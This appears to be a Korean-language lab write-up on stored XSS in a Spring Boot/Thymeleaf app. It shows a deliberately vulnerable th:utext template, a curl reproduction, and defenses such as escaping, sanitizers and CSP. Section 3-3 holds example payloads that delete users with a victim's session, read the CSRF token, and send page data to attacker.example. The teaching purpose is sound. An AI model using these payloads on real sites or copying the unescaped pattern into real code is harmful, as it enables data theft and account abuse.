# 07. XSS (Cross-Site Scripting) 실습

> OWASP Top 10 2025 **#5 인젝션**(Injection) — SQL/명령 인젝션과 같은 카테고리, "입력이 명령으로 실행됨"의 HTML/JS 버전
> 브랜치: `feature/xss-demo`
> 대상 코드: `UserController`(`index`/`index-vuln`) + `index.html`/`index-vuln.html`

---

## 1. 개념 요약

**XSS(Cross-Site Scripting)** 는 공격자가 넣은 문자열이 **다른 사용자의 브라우저에서 HTML/스크립트로 해석·실행**되는 취약점이다.

- SQL Injection이 "입력이 **DB 명령**으로 실행"되는 것이라면, XSS는 "입력이 **브라우저 명령(HTML/JS)**으로 실행"되는 것이다. 같은 **#5 인젝션** 카테고리에 묶이는 이유다.
- 세 가지 유형:
  - **Stored(저장형)**: 입력이 **DB에 저장**되고, 그 데이터를 보는 **모든 사용자**에게 실행된다. 피해 범위가 가장 넓다 — 이번 실습 대상.
  - **Reflected(반사형)**: 입력이 그 요청의 **응답에만** 그대로 반사된다(예: 검색어를 그대로 출력). 공격자가 만든 링크를 피해자가 클릭해야 한다.
  - **DOM-based**: 서버를 거치지 않고 **브라우저 JS**가 직접 `innerHTML` 등으로 위험하게 조작할 때 발생.

**핵심 원인**: 출력(렌더링) 시점에 **이스케이프를 하지 않는 것**. 입력을 막는 것(블랙리스트)보다, **출력할 때 HTML 특수문자(`<`,`>`,`&`,`"` 등)를 엔티티로 바꾸는 것**이 근본 대응이다.

---

## 2. 이 앱의 취약점

Thymeleaf는 기본적으로 **`th:text`가 자동 이스케이프**를 한다. 안전한 `index.html`은 원래 이것만 쓰고 있었다(LOW 등급으로 "양호" 판정됨). 이번 실습을 위해 **같은 데이터를 다르게 렌더링하는 취약 페이지를 별도로 추가**했다.

**표적**: 회원 이름(`User.name`) — `UserController`의 `/users/signup`(가입) → `/users/index-vuln`(목록) 경로.

### 2-1. User 엔티티 — 입력 쪽엔 제약이 없다

```java
@Column(nullable = false)
@NotBlank(message = "Name은 필수 입력항목입니다.")
private String name;
```
`@NotBlank`(공백 금지)만 있을 뿐, **길이 제한도 `<`/`>` 같은 특수문자 제한도 없다.** 즉 `<script>...</script>`를 그대로 저장할 수 있다.

### 2-2. UserController — 안전/취약 핸들러를 나란히 둔다 (CSRF 데모와 동일한 패턴)

```java
//[안전 ✅][XSS 하드닝] index.html 은 th:text(자동 이스케이프)로 렌더링한다.
//  - 이름에 <script> 등을 넣어도 문자열 그대로 화면에 표시될 뿐 실행되지 않는다.
@GetMapping("/index")
public String index(Model model) {
    model.addAttribute("users", userRepository.findAll());
    return "index";
}

//[취약 ⚠️ - Stored XSS 공격 재현 실습 전용]
//  같은 데이터(users)를 index-vuln.html 로 내려주는데, 그 템플릿은 이름을 th:utext(이스케이프 없음)로 렌더링한다.
//  - 회원가입(이름 필드)에 <script>...</script> 를 넣고 저장하면,
//    이 목록 페이지를 "보는 모든 사용자(관리자 포함)" 의 브라우저에서 그 스크립트가 그대로 실행된다.
//  - 실무에서는 절대 두면 안 되는 안티패턴이다. 오직 공격 재현 실습을 위해 남긴다.
//  - 방어 : 이 핸들러/템플릿을 제거하고 위의 안전한 /index(th:text) 만 쓰면 재현이 불가능해진다.
@GetMapping("/index-vuln")
public String indexVulnerable(Model model) {
    model.addAttribute("users", userRepository.findAll());
    return "index-vuln";
}
```

### 2-3. index.html vs index-vuln.html — 렌더링 태그 하나 차이

**`th:text` vs `th:utext` — 먼저 이 둘의 차이를 짚는다.**

- **`th:text`** (Thymeleaf 표준 출력 속성): 표현식 결과를 텍스트로 삽입하면서 `<`,`>`,`&`,`"`,`'` 같은 HTML 특수문자를 **자동으로 엔티티(`&lt;`,`&gt;`...)로 치환(escape)** 한다. 브라우저에게 "이건 데이터일 뿐, 태그가 아니다"라고 알려주는 것과 같다. 그래서 값에 `<script>`가 들어 있어도 화면엔 그 글자 그대로 보이고 **실행되지 않는다.**
- **`th:utext`**("unescaped text"): escape를 **하지 않고** 표현식 결과를 **그대로 HTML로 해석**해서 삽입한다. 값에 `<b>굵게</b>`가 들어 있으면 실제로 굵게 렌더링되고, `<script>`가 들어 있으면 **그대로 실행된다.** 원래 쓰임새는 "이미 안전함이 확인된 HTML 조각(서버가 직접 만든 것, 또는 sanitizer를 거친 것)을 그대로 출력"하는 것이지, **신뢰할 수 없는 사용자 입력에 쓰면 안 된다.**

| 속성 | 이스케이프 | 결과 | 신뢰할 수 없는 사용자 입력에 |
|---|---|---|---|
| `th:text` | 함(자동) | 항상 "문자열"로 표시 | 안전 ✅ (Thymeleaf 기본 권장) |
| `th:utext` | 안 함 | 값 속 태그/스크립트를 "HTML로 해석"해 실행 | 위험 🔴 |

이 둘의 차이를 실제 코드에 적용하면 아래처럼, **딱 한 글자(`u`) 차이**로 안전/취약이 갈린다:

```html
<!-- index.html (안전 ✅) -->
<td th:text="${user.name}"></td>

<!-- index-vuln.html (취약 ⚠️) -->
<td th:utext="${user.name}"></td>
```
`th:text`→`th:utext` **단 하나의 차이**가 "문자열로 표시"와 "HTML/스크립트로 실행"을 가른다.

### 2-4. 변경/추가 파일 한눈에 보기 (이 브랜치 기준, 3곳)

| 파일 | 구분 | 한 일 |
|---|---|---|
| `UserController.java` | 수정 | `/index`(안전)에 설명 주석 추가, `/index-vuln`(취약) 핸들러 신규 추가 |
| `index.html` | 수정 | 취약 데모 페이지로 이동하는 "⚠️ XSS 데모(취약)" 링크 추가 |
| `index-vuln.html` | 추가 | `th:utext`로 렌더링하는 취약 템플릿(신규 파일) |

`index.html`에 추가된 두 줄:
```html
<!-- [교육용] XSS(Stored) 공격 재현 전용 페이지로 이동 -->
<a href="/users/index-vuln" class="btn btn-outline-danger">⚠️ XSS 데모(취약)</a>
```

`index-vuln.html`(신규 파일)의 핵심만 보면 — **안전한 `index.html`과 구조는 동일**하고(표·Edit·Delete·네비게이션 버튼 등 그대로), 실제로 다른 부분은 **딱 두 곳**이다:
```html
<!-- 상단 경고 배너(신규) -->
<div class="alert alert-danger" role="alert">
    ⚠️ XSS 취약 데모 페이지 — 아래 Name 컬럼은 <code>th:utext</code>(이스케이프 없음)로 렌더링된다. ...
</div>

<!-- Name 컬럼 렌더링(§2-3에서 본 핵심 차이) -->
<td th:utext="${user.name}"></td>
```
나머지(Email 컬럼, Edit/Delete 버튼, 하단 네비게이션)는 `index.html`을 그대로 복사한 것이라 안전 측과 동일하다.

---

## 3. 공격 실습 (취약 상태, 검증됨 — 2026-10-02)

### 3-1. 시나리오

1. 공격자가 (또는 공격자가 유도한 어떤 사용자가) **회원가입 폼의 이름 필드**에 스크립트를 넣어 가입한다.
2. 그 값은 `users` 테이블에 **그대로 저장**된다(Stored).
3. 이후 **누구든 `/users/index-vuln`(목록) 페이지를 열면** — 관리자를 포함해서 — 저장된 스크립트가 **그 사람의 브라우저에서 실행**된다.

### 3-2. curl 재현 (서버가 실제로 내려주는 raw HTML 기준, 검증됨)

```bash
B=http://localhost:8080; JAR=cookies.txt
# 1) 세션 로그인 (폼 로그인 체인은 CSRF 활성 → GET /login 에서 토큰 추출)
CSRF=$(curl -s -c $JAR "$B/login" | grep -o 'name="_csrf" value="[^"]*"' | sed 's/.*value="\(.*\)"/\1/')
curl -s -b $JAR -c $JAR -X POST "$B/login-process" \
  --data-urlencode "username=admin@aa.com" --data-urlencode "password=pwd1" \
  --data-urlencode "_csrf=$CSRF"

# 2) 악성 이름으로 회원 추가 (signup 페이지에서 새 _csrf 추출)
CSRF2=$(curl -s -b $JAR "$B/users/signup" | grep -o 'name="_csrf" value="[^"]*"' | sed 's/.*value="\(.*\)"/\1/')
curl -s -b $JAR -c $JAR -X POST "$B/users/adduser" \
  --data-urlencode "name=<script>alert(document.domain)</script>" \
  --data-urlencode "email=xss-demo@aa.com" \
  --data-urlencode "_csrf=$CSRF2"

# 3) 두 목록 페이지가 내려주는 raw HTML 비교
curl -s -b $JAR "$B/users/index"      | grep -o "&lt;script&gt;.*&lt;/script&gt;\|<script>.*</script>"
curl -s -b $JAR "$B/users/index-vuln" | grep -o "&lt;script&gt;.*&lt;/script&gt;\|<script>.*</script>"
```

**명령 해설** — 실제 "공격"은 2번(회원가입) 한 줄뿐이고, 1번은 그 공격을 실행하기 위한 **로그인(세션 확보)**, 3번은 **공격이 먹혔는지 확인**하는 단계다.

| 단계 | 명령 | 하는 일 / 이유 |
|---|---|---|
| 0 | `B=...; JAR=cookies.txt` | 서버 주소와, curl이 쿠키를 저장/재사용할 **쿠키 저장 파일** 이름을 변수로 지정 |
| 1-1 | `CSRF=$(curl ... "$B/login" \| grep ... \| sed ...)` | 로그인 폼 페이지(`GET /login`)를 받아, 그 안에 Thymeleaf가 자동 삽입한 **hidden `_csrf` 토큰 값만 추출**. 폼 로그인 체인은 CSRF가 켜져 있어서 로그인 POST에도 이 토큰이 필요하다 |
| 1-2 | `curl ... -X POST "$B/login-process" ...` | `username`/`password`/`_csrf`를 담아 **세션 로그인**. 성공하면 응답의 `Set-Cookie: JSESSIONID=...`가 `-c $JAR` 옵션으로 `$JAR` 파일에 저장된다 — 이후 요청은 `-b $JAR`로 이 쿠키를 그대로 실어 보낸다 |
| 2-1 | `CSRF2=$(curl ... "$B/users/signup" \| ...)` | 회원가입 폼 페이지에서 **그 폼 전용 `_csrf` 토큰**을 다시 추출(세션은 1에서 로그인된 상태 유지, `-b $JAR`) |
| **2-2** | `curl ... -X POST "$B/users/adduser" --data-urlencode "name=<script>..." ...` | **실제 공격.** 이름 필드에 `<script>alert(document.domain)</script>`를 넣어 **회원가입 → DB에 그대로 저장**(Stored). 이 한 번의 요청으로 공격이 완성된다 |
| 3 | `curl ... "$B/users/index"` / `"$B/users/index-vuln"` | 공격 **확인 단계.** 같은 데이터를 다르게 렌더링하는 두 목록 페이지를 각각 요청해, 응답 HTML에 `<script>`가 **이스케이프된 채로**(`&lt;script&gt;`) 오는지, **그대로**(`<script>`) 오는지 `grep`으로 비교 |

> 보조 도구: `grep -o 'name="_csrf" value="[^"]*"'`는 HTML에서 hidden input의 `value="..."` 부분만 뽑아내고, 뒤의 `sed 's/.*value="\(.*\)"/\1/'`는 그중 **순수한 토큰 값만** 남긴다(CSRF 문서의 `grep -oP '...\K...'` 와 같은 목적, 다른 문법).

**결과**:
| 페이지 | 서버가 내려준 raw HTML | 브라우저에서 |
|---|---|---|
| `/users/index`(안전) | `&lt;script&gt;alert(document.domain)&lt;/script&gt;` | 문자열 그대로 표시 — **실행 안 됨** |
| `/users/index-vuln`(취약) | `<script>alert(document.domain)</script>` | **실행됨** — 이 페이지를 연 모든 사용자에게 |

→ curl로 서버 응답을 직접 비교해, 같은 데이터인데 렌더링 방식(`th:text` vs `th:utext`)에 따라 **이스케이프 여부가 갈리는 것**을 raw HTML 레벨에서 확인했다. `<script>` 태그가 이스케이프 없이 그대로 응답에 포함되면, 이를 렌더링하는 모든 브라우저는 그 스크립트를 실행한다(브라우저의 표준 동작).

### 3-3. "쿠키를 훔치지 못하면 안전한 것 아닌가?" — 아니다

로그인 과정에서 받은 세션 쿠키를 보면:
```
Set-Cookie: JSESSIONID=FD95C13B90D339FF2724E42A514916A6; Path=/; HttpOnly
```
**`HttpOnly`가 이미 붙어 있다**(Spring Boot 기본값). 즉 `document.cookie`로 `JSESSIONID`의 **값을 읽어서** 외부로 빼돌리는 "교과서적" XSS 쿠키 탈취는 **이 앱에서 처음부터 안 된다.**

**하지만 여기서 꼭 짚어야 할 점**: `HttpOnly`는 **"JS가 쿠키 값을 읽는 것"만** 막는다. **"브라우저가 요청에 그 쿠키를 자동으로 실어 보내는 것"은 전혀 막지 못한다.** 즉 공격자의 스크립트가 쿠키 *값*을 몰라도, 그 스크립트가 같은 페이지 안에서 `fetch()`/`XMLHttpRequest`로 요청을 보내면 **브라우저가 평소처럼 JSESSIONID를 자동으로 붙여준다** — 공격자는 쿠키를 훔칠 필요 없이 **피해자의 세션을 그 자리에서 바로 빌려 쓸 수 있다.** 이걸 전제로, 구체적으로 어떤 공격이 가능한지 세 가지로 나눠본다.

**(A) 피해자 권한으로 임의 행동 대행** — 삭제·수정처럼 피해자만 할 수 있는 요청을 스크립트가 대신 보낸다.
```html
<script>fetch('/users/delete/1', {method:'POST', credentials:'include', ... })</script>
```
이 페이지(`/users/index-vuln`)를 **관리자가 열면**, 스크립트는 그 관리자의 권한으로 동작한다 — 공격자는 평범한 계정으로 가입만 했을 뿐인데, 결과적으로 **관리자 권한의 행동**을 끌어낸 것과 같다.

**(B) CSRF 토큰까지 그 자리에서 훔쳐 CSRF 방어를 무력화** — (A)의 `/users/delete/{id}`는 실제로는 CSRF 토큰(`_csrf`)이 있어야 통과된다(§05 CSRF 참고). 그런데 그 토큰은 **같은 페이지의 hidden input에 그대로 들어 있어서**, 스크립트가 DOM에서 직접 읽어 요청에 끼워 넣을 수 있다:
```html
<script>
  const token = document.querySelector('input[name="_csrf"]').value;
  fetch('/users/delete/1', {method:'POST', credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'_csrf='+token});
</script>
```
CSRF 방어는 "**다른 출처(origin)**에서 오는 위조 요청"을 막는 것이지, **같은 출처 안에서 실행되는 XSS 스크립트가 그 출처의 토큰을 직접 읽는 것**은 전혀 막지 못한다 — **CSRF 토큰이 있어도 XSS 앞에서는 무력화된다.**

**(C) 화면에 보이는 데이터를 외부로 유출(exfiltration)** — 쿠키를 훔치는 것보다 더 직접적인 방법이다. 스크립트는 **그 페이지에 보이는 모든 내용(DOM)을 그냥 읽을 수 있다** — 여기엔 `HttpOnly`가 아예 적용되지 않는다(쿠키가 아니라 화면 내용이므로). `/users/index-vuln`에는 **모든 회원의 이름·이메일**이 나열돼 있으므로:
```html
<script>
  fetch('https://attacker.example/collect', {method:'POST',
    body: document.querySelector('table').innerText});
</script>
```
이 한 줄로 **그 페이지를 본 사람이 볼 수 있는 모든 데이터**가 공격자 서버로 전송된다.

> **정리**: `HttpOnly`는 "쿠키 값을 훔쳐서 나중에 재사용"하는 **한 가지 시나리오만** 막는다. XSS의 진짜 위험은 스크립트가 **그 순간, 그 페이지 안에서, 피해자의 권한으로** 무엇이든 할 수 있다는 것이다 — 행동을 대행하고(A), 그 행동을 막아야 할 CSRF 토큰조차 직접 읽어 가고(B), 화면에 보이는 데이터를 통째로 빼간다(C). 세 가지 모두 쿠키 값과 무관하다.
>
> *(개념 설명 — 위 (A)(B)(C) 스크립트 자체를 브라우저로 직접 실행해 검증하지는 않았다. §3-2 에서 실측 검증한 것은 "payload 가 이스케이프 없이 그대로 응답에 포함되어, 브라우저가 이를 실행 가능한 스크립트로 해석한다"는 사실이다. 거기서 한 단계 더 나가면 (A)(B)(C) 같은 구체적 피해로 이어진다는 것이 이 절의 설명이다.)*

---

## 4. 방어 (안전 버전)

### 4-1. 기본값으로 복귀 — `th:utext` → `th:text`

```html
<td th:text="${user.name}"></td>
```
Thymeleaf의 `th:text`는 `<`,`>`,`&`,`"`,`'` 를 자동으로 HTML 엔티티(`&lt;`,`&gt;`...)로 바꿔서 출력한다. **이것이 기본값이고, `th:utext`는 "이스케이프를 끄는" 예외적 선택**이라는 걸 기억해야 한다 — 신뢰할 수 없는 사용자 입력에는 절대 쓰면 안 된다.

### 4-2. 입력 쪽 보강(선택) — 길이·패턴 제한

이스케이프가 근본 대응이지만, 입력 검증을 더하면 저장 단계에서부터 걸러낼 수 있다:
```java
@NotBlank(message = "Name은 필수 입력항목입니다.")
@Size(max = 50, message = "이름은 50자를 넘을 수 없습니다.")
private String name;
```

### 4-3. 리치 텍스트가 꼭 필요하다면 — 화이트리스트 sanitizer

> **리치 텍스트(rich text)란?** 굵게·기울임·목록·링크·색상처럼 **서식이 있는 텍스트**를 말한다(일반 텍스트와 대조). 웹에서는 보통 **HTML 태그**로 표현된다(예: `<b>굵게</b>`, `<a href="...">링크</a>`). 게시판·댓글의 "글쓰기 에디터"처럼, 사용자가 일부 서식을 직접 넣을 수 있게 허용해야 하는 기능이 있다면 바로 이 리치 텍스트 문제를 마주하게 된다.

게시글처럼 **일부 HTML 태그를 허용해야** 하는 경우(블랙리스트로 막는 방식은 우회가 계속 발견되어 왔다 — 항상 깨진다)에는, `th:text`로 전부 막는 대신 서버에서 **허용 태그만 남기는 sanitizer**(예: OWASP Java HTML Sanitizer, jsoup)를 거친 뒤 `th:utext`로 출력한다. 이 앱은 그런 요구가 없어 **`th:text`(완전 이스케이프)만으로 충분**하다.

**안전하게 허용할 수 있는 태그 (화이트리스트 예시)**

| 구분 | 태그 예시 |
|---|---|
| 텍스트 서식 | `b`, `strong`, `i`, `em`, `u`, `s`, `sub`, `sup` |
| 구조 | `p`, `br`, `div`, `span`, `blockquote`, `pre`, `code` |
| 목록 | `ul`, `ol`, `li` |
| 제목(필요시) | `h1`~`h6` |
| 링크(속성 제한 필수) | `a` — `href` 는 `http`/`https`/`mailto` 스킴만 |
| 이미지(필요시) | `img` — `src` 는 `http`/`https` 만, `data:` 는 금지 |

> **스킴(scheme)이란?** URL의 **`:` 앞부분**, 즉 "이 자원을 어떻게 다룰지" 알려주는 프로토콜 식별자다. 예: `https://example.com` → 스킴은 `https`, `javascript:alert(1)` → 스킴은 `javascript`, `data:text/html,...` → 스킴은 `data`. "`href`/`src` 스킴을 제한한다"는 말은 **그 속성 값(URL)의 맨 앞 스킴 부분만 검사해서, 허용한 스킴(`http`/`https`/`mailto` 등)이 아니면 거부**한다는 뜻이다 — `<a href="javascript:...">`처럼 스킴 자체가 위험한 값을 이렇게 막는다.

- **jsoup**은 이런 조합을 **프리셋**으로 제공한다: `Safelist.none()`(태그 전부 제거) → `.simpleText()`(b/em/i/strong/u) → `.basic()`(위 표의 서식·구조·목록 + 제한된 `a`) → `.basicWithImages()`(`basic` + `img`) → `.relaxed()`(제목·표까지 확장) 순으로 점점 넓어진다.
- **OWASP Java HTML Sanitizer**도 `Sanitizers.FORMATTING`, `.LINKS`, `.BLOCKS`, `.STYLES`, `.TABLES`, `.IMAGES` 같은 프리셋을 `.and()`로 조합해 정책을 만든다(예: `Sanitizers.FORMATTING.and(Sanitizers.LINKS)`).

**반드시 제거해야 하는 위험한 요소**

| 요소 | 위험 |
|---|---|
| `<script>` | 스크립트 직접 실행 |
| `on*` 이벤트 속성(`onclick`,`onerror`,`onload`...) | 태그에 스크립트를 숨겨 실행 |
| `javascript:` URL(`href`/`src`) | 링크 클릭·이미지 로드만으로 스크립트 실행 |
| `<iframe>`/`<object>`/`<embed>` | 임의 외부 콘텐츠·플러그인 삽입 |
| `<style>` 태그 / `style` 속성 | CSS 인젝션, `url()`을 이용한 데이터 유출 |
| `<form>`/`<input>`/`<button>` | 피싱 폼 삽입 |
| `data:` URI(특히 `text/html`) | base64로 인코딩한 스크립트를 숨겨 삽입 |
| `<base>` | 페이지의 상대경로를 가로채 다른 리소스로 유도 |

**그래도 꼭 필요하다면 — 유의사항**

위험 요소는 원칙적으로 제거하는 것이지만, 기능상 꼭 필요한 경우를 위한 완화책이다 — "허용하되 안전하게" 좁히는 것이지, 그대로 통과시키는 게 아니다.
- **이미지**: `src` 스킴을 `http`/`https`로만 제한하고 `data:`는 금지. 가능하면 외부 URL을 그대로 쓰지 말고 **서버가 다시 내려받아 재호스팅**(이미지 프록시)해서 추적·우회를 차단하고, `onerror` 같은 이벤트 속성은 무조건 제거한다.
- **링크**: `href` 스킴을 `http`/`https`/`mailto`로 제한(`javascript:` 차단)하고, 외부 링크엔 `rel="noopener noreferrer nofollow"`를 강제로 붙인다(새 탭 하이재킹·리퍼러 유출 방지).
- **인라인 서식(style)**: 허용 속성을 색상·폰트 크기 정도로 **극히 제한**하고, `url()`·`expression()`·`@import`는 금지한다. 가능하면 style 속성 자체를 막고 미리 정의된 CSS 클래스만 쓰게 하는 쪽이 더 안전하다.
- **임베드(iframe)**: 사용자가 `<iframe src="...">`를 직접 쓰게 하면 안 된다 — 대신 **URL만 입력받아 서버가 신뢰 도메인(예: youtube.com) 화이트리스트로 검증**한 뒤, 서버가 직접 `<iframe>` 마크업을 생성하고 `sandbox` 속성으로 최소 권한만 부여한다.
- **공통 원칙**: sanitizer 라이브러리는 우회 기법이 발견될 때마다 패치되므로 **최신 버전을 유지**하고, 허용 목록은 "필요한 만큼만" 최소로 유지한다. §4-4의 **CSP 헤더**를 함께 적용해, sanitizer가 혹시 놓친 것에 대한 2차 방어선을 둔다.

### 4-4. 심층 방어 — CSP(Content-Security-Policy) 헤더(선택)

출력 이스케이프가 1차 방어라면, **CSP는 "혹시 뚫렸을 때"의 2차 방어선**이다. `script-src 'self'` 같은 정책을 헤더로 내려보내면, 인라인 `<script>`나 외부 스크립트 로드를 브라우저 차원에서 차단해 XSS의 피해를 줄일 수 있다(이 앱에는 미적용 — 운영 환경에서 고려할 항목으로 기록).

### 검증 (안전 버전, 검증됨)

| 테스트 | 결과 |
|---|---|
| `/users/index`(th:text)에 `<script>` 이름 조회 | `&lt;script&gt;...&lt;/script&gt;` — 문자열로만 표시 ✅ |
| `/users/index-vuln`(th:utext)에 같은 이름 조회 | `<script>...</script>` — 이스케이프 없이 그대로 삽입 🔴 |

---

## 5. 방어 정리

| 방법 | 설명 |
|---|---|
| **출력 이스케이프**(핵심) | `th:text`(Thymeleaf 기본값)로 HTML 특수문자를 항상 엔티티로 변환 |
| 입력 검증(보조) | 길이·허용 문자 제한으로 저장 단계에서도 걸러내기 |
| 화이트리스트 sanitizer | 리치 텍스트가 꼭 필요할 때만, 허용 태그만 남기고 나머지 제거 |
| `HttpOnly` 쿠키 | 세션 쿠키 탈취(`document.cookie`)는 막아주지만, XSS 자체를 막지는 못함(이미 기본값) |
| CSP 헤더(심화) | 뚫렸을 때의 2차 방어선 — 인라인/외부 스크립트 실행 범위 제한 |

> **교육 포인트**: XSS 방어의 원칙은 "입력을 막는다"가 아니라 **"출력할 때 반드시 이스케이프한다"** 이다. 어떤 값이 나중에 위험한 맥락(HTML)에 출력될지 입력 시점엔 알 수 없는 경우가 많고, 블랙리스트 기반 입력 필터링은 우회가 계속 발견되어 왔다.

---

## 6. 관련 문서
- 개념: `OWASP_Top10_2025_한글요약` (#5 인젝션 — SQL/XSS 공통 원인: 입력이 명령으로 실행됨)
- 유사 구조: `05_CSRF` — "안전 핸들러 + 취약 핸들러를 같은 경로/데이터에 나란히 두고 비교"하는 실습 패턴이 동일
- §3-3에서 언급한 CSRF 우회(same-origin XSS가 `_csrf` 토큰을 직접 읽는 것)는 `05_CSRF.md` §4-2(Thymeleaf `_csrf` 자동 삽입 원리)와 함께 보면 이해가 쉽다
